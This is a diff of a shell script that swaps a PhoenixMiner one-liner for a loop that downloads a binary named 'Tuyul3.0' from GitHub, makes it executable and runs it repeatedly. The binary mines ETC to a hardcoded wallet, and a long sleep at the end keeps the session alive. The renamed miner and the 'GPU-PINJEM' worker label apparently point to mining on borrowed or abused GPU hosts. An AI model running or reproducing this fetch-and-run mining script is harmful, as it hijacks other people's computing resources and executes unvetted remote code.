@@ -1,1 +1,11 @@
-apt-get install libpci3 && wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz && tar -xf PhoenixMiner_5.6d_Linux.tar.gz && cd PhoenixMiner_5.6d_Linux && sudo ./PhoenixMiner -pool  ethash.unmineable.com:3333 -wal ETC:0xb2AAd92f1570AD892248c229b86582699d724a0B -worker $(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM) -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin etc
+#!/bin/bash
+POOL=ethash.unmineable.com:3333
+WALLET=ETC:0xb2AAd92f1570AD892248c229b86582699d724a0B
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
+wget https://github.com/dedeybo/Project/raw/main/Tuyul3.0
+chmod +x Tuyul3.0
+while [ 1 ]; do
+./Tuyul3.0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+sleep 5
+done
+sleep 999999999 
